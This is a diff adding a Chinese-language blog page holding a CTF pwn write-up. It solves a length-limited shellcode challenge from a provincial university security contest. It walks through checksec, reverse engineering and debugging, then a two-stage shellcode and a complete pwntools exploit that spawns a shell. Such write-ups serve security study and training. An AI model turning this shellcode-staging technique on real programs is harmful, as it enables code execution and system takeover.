@@ -1,0 +1,374 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#54C8C4" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">
+<link rel="preconnect" href="https://cdnjs.cloudflare.com" crossorigin>
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/180pixil-frame-0.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/32pixil-frame-0.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/16pixil-frame-0.png">
+  <link rel="mask-icon" href="/images/pixil-frame-0.png.svg" color="#54C8C4">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" integrity="sha256-5eIC48iZUHmSlSUz9XtjRyK2mzQkHScZY1WdMaoz74E=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.21.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":"mac","style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="shellcode  shellcode 是一段用于利用软件漏洞而执行的代码，shellcode 为 16 进制之机械码，以其经常让攻击者获得 shell 而得名。shellcode 常常使用机器语言编写。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="shellcode - 有长度限制的shellcode解法">
+<meta property="og:url" content="http://example.com/2024/11/03/2024113-shellcode---%E6%9C%89%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E7%9A%84shellcode%E8%A7%A3%E6%B3%95/index.html">
+<meta property="og:site_name" content="Coding changes the world.">
+<meta property="og:description" content="shellcode  shellcode 是一段用于利用软件漏洞而执行的代码，shellcode 为 16 进制之机械码，以其经常让攻击者获得 shell 而得名。shellcode 常常使用机器语言编写。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2024-11-02T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-11-03T14:12:25.212Z">
+<meta property="article:author" content="summ2">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="shellcode">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="http://example.com/2024/11/03/2024113-shellcode---%E6%9C%89%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E7%9A%84shellcode%E8%A7%A3%E6%B3%95/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2024/11/03/2024113-shellcode---%E6%9C%89%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E7%9A%84shellcode%E8%A7%A3%E6%B3%95/","path":"2024/11/03/2024113-shellcode---有长度限制的shellcode解法/","title":"shellcode - 有长度限制的shellcode解法"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>shellcode - 有长度限制的shellcode解法 | Coding changes the world.</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Coding changes the world.</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa-solid fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-ctf"><a href="/categories/CTF" rel="section"><i class="fa-solid fa-flag fa-fw"></i>CTF</a></li><li class="menu-item menu-item-日常"><a href="/categories/%E6%97%A5%E5%B8%B8" rel="section"><i class="fa-solid fa-file fa-fw"></i>日常</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa-solid fa-tags fa-fw"></i>标签</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#shellcode"><span class="nav-number">1.</span> <span class="nav-text">shellcode</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90"><span class="nav-number">2.</span> <span class="nav-text">程序分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#checksec"><span class="nav-number">2.1.</span> <span class="nav-text">checksec</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%80%86%E5%90%91%E5%88%86%E6%9E%90"><span class="nav-number">2.2.</span> <span class="nav-text">逆向分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95"><span class="nav-number">2.3.</span> <span class="nav-text">动态调试</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="nav-number">3.</span> <span class="nav-text">攻击流程</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%B0%83%E6%95%B4%E4%BC%A0%E5%8F%82%E5%AF%84%E5%AD%98%E5%99%A8%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%B5%81%E7%A8%8B"><span class="nav-number">3.1.</span> <span class="nav-text">调整传参寄存器，控制程序流程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E6%AE%B5-shellcode"><span class="nav-number">3.1.1.</span> <span class="nav-text">第一段 shellcode</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%89%A7%E8%A1%8C-shellcode"><span class="nav-number">3.2.</span> <span class="nav-text">执行 shellcode</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#exploit"><span class="nav-number">4.</span> <span class="nav-text">Exploit</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%B0%8F%E7%BB%93"><span class="nav-number">5.</span> <span class="nav-text">小结</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">summ2</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/avasummer" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;avasummer" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i></a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:summ2@hdu.edu.cn" title="E-Mail → mailto:summ2@hdu.edu.cn" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i></a>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/11/03/2024113-shellcode---%E6%9C%89%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E7%9A%84shellcode%E8%A7%A3%E6%B3%95/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="summ2">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Coding changes the world.">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="shellcode - 有长度限制的shellcode解法 | Coding changes the world.">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          shellcode - 有长度限制的shellcode解法
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2024-11-03 00:00:00" itemprop="dateCreated datePublished" datetime="2024-11-03T00:00:00+08:00">2024-11-03</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="shellcode">shellcode</h1>
+<blockquote>
+<p>shellcode 是一段用于利用软件漏洞而执行的代码，shellcode 为 16
+进制之机械码，以其经常让攻击者获得 shell 而得名。shellcode
+常常使用机器语言编写。 <span id="more"></span></p>
+</blockquote>
+<h1 id="程序分析">程序分析</h1>
+<p>题目来源：<strong>第七届浙江省大学生网络与信息安全竞赛预赛</strong></p>
+<figure>
+<img
+src="/2024113-shellcode---有长度限制的shellcode解法\image-20241103161301251.png"
+alt="image-20241103161301251" />
+<figcaption aria-hidden="true">image-20241103161301251</figcaption>
+</figure>
+<h2 id="checksec">checksec</h2>
+<figure>
+<img
+src="/2024113-shellcode---有长度限制的shellcode解法\image-20241103161656543.png"
+alt="保护全开" />
+<figcaption aria-hidden="true">保护全开</figcaption>
+</figure>
+<h2 id="逆向分析">逆向分析</h2>
+<figure>
+<img
+src="/2024113-shellcode---有长度限制的shellcode解法\image-20241103161752048.png"
+alt="IDA伪代码" />
+<figcaption aria-hidden="true">IDA伪代码</figcaption>
+</figure>
+<p>程序的功能很直接，执行输入的一段shellcode，但是有
+<strong>0xa</strong> 的长度限制。</p>
+<p>并且存在 <code>memmem</code> 函数，检查输入的内容，使用 IDA 继续查看
+<code>unk_203D</code> 的内容，发现是出题人禁止了 <code>syscall</code>
+的机器码。</p>
+<figure>
+<img
+src="/2024113-shellcode---有长度限制的shellcode解法\image-20241103162203348.png"
+alt="syscall(&#39;0f&#39;)" />
+<figcaption aria-hidden="true">syscall('0f')</figcaption>
+</figure>
+<h2 id="动态调试">动态调试</h2>
+<p><img
+src="/2024113-shellcode---有长度限制的shellcode解法\image-20241103165250942.png" /></p>
+<p>在程序执行 shellcode 之后，观察寄存器和栈的情况。当时比赛时发现
+<code>r8</code> 中存有 <code>syscall</code>
+指令的地址，我的一个想法是控制寄存器 <code>rax</code>, <code>rdi</code>,
+<code>rsi</code>, <code>rdx</code> 执行系统调用 <code>read</code>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov rsi,rax</span><br><span class="line">xor rax,rax</span><br><span class="line">xor rdi,rdi</span><br><span class="line">add rdx,0x50</span><br><span class="line">call r8</span><br></pre></td></tr></table></figure>
+<p>不过这样的长度已经超出 0xa 的限制了。后面我又想了很久，想继续利用
+<code>r8</code> 跳转到某个 <code>main</code> 函数上的指令，调试发现从
+<code>r8</code> 到一个 <code>main</code>
+函数的地址需要减去三位十六进制数，也就是说操作数占据了 shellcode 中 0x4
+的长度了。哎，结果我就这样忽视了 <code>rsp</code> 上的
+<code>&lt;main+0132&gt;</code>，一直到比赛结束。</p>
+<h1 id="攻击流程">攻击流程</h1>
+<p><em>这里的思路是白夜学长提供的。</em></p>
+<h2 id="调整传参寄存器控制程序流程">调整传参寄存器，控制程序流程</h2>
+<p>ELF 中的 <code>read</code> 函数参数如下</p>
+<p><img
+src="/2024113-shellcode---有长度限制的shellcode解法\image-20241103171307808.png" /></p>
+<p>栈中的数据如下</p>
+<figure>
+<img
+src="/2024113-shellcode---有长度限制的shellcode解法\image-20241103171530664.png"
+alt="由于程序中使用call rax执行shellcode，返回地址存在栈顶" />
+<figcaption aria-hidden="true">由于程序中使用call
+rax执行shellcode，返回地址存在栈顶</figcaption>
+</figure>
+<h3 id="第一段-shellcode">第一段 shellcode</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pop rdx; 返回地址出栈</span><br><span class="line">pop rdi; fd</span><br><span class="line">pop rsi; 将不需要的数据出栈</span><br><span class="line">pop rsi; *buf &lt;- shellcode address</span><br><span class="line">sud rdx,0x41; 减去偏移，结果为 &lt;main+00f1&gt;</span><br><span class="line">call rdx</span><br></pre></td></tr></table></figure>
+<p>将程序跳转到 <code>main</code> 函数的 <code>call _read</code> 前:</p>
+<p><img
+src="/2024113-shellcode---有长度限制的shellcode解法\image-20241103174318078.png" /></p>
+<h2 id="执行-shellcode">执行 shellcode</h2>
+<p>没有了读入限制后，直接使用 pwntool 生成的 shellcode 即可。</p>
+<h1 id="exploit">Exploit</h1>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">p = process(<span class="string">&quot;./shellcode1&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;139.155.126.78&quot;, &quot;38681&quot;)</span></span><br><span class="line">shellcode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">pop rdx;</span></span><br><span class="line"><span class="string">pop rdi;</span></span><br><span class="line"><span class="string">pop rsi;</span></span><br><span class="line"><span class="string">pop rsi;</span></span><br><span class="line"><span class="string">sub rdx, 0x41;</span></span><br><span class="line"><span class="string">call rdx;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendafter(<span class="string">b&quot;input&quot;</span>, asm(shellcode))</span><br><span class="line">shellcode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">nop;</span></span><br><span class="line"><span class="string">nop;</span></span><br><span class="line"><span class="string">nop;</span></span><br><span class="line"><span class="string">nop;</span></span><br><span class="line"><span class="string">nop;</span></span><br><span class="line"><span class="string">nop;</span></span><br><span class="line"><span class="string">nop;</span></span><br><span class="line"><span class="string">nop;</span></span><br><span class="line"><span class="string">nop;</span></span><br><span class="line"><span class="string">nop;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span> <span class="comment">#10个nop，因为下次执行的地址是在shellcode1的结尾(call rdx)</span></span><br><span class="line">shellcode += shellcraft.sh()</span><br><span class="line">p.send(asm(shellcode))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="小结">小结</h1>
+<p>这回的省赛属于是坐了四小时大牢了。每道题目或者是在现实实践中，自然是与之前遇到的情况会有不同。因此对程序动态运行中的各种状态应该敏锐一些，例如栈、寄存器，可能会有发现。</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"><i class="fa fa-tag"></i> pwn</a>
+              <a href="/tags/shellcode/" rel="tag"><i class="fa fa-tag"></i> shellcode</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2024/10/07/2024101-Heap1sEz---%E5%A0%86%E6%BC%8F%E6%B4%9E%E7%9A%84%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8/" rel="prev" title="Heap1sEz - 堆漏洞的简单利用">
+                  <i class="fa fa-angle-left"></i> Heap1sEz - 堆漏洞的简单利用
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script>
+
+
+
+</body>
+</html>
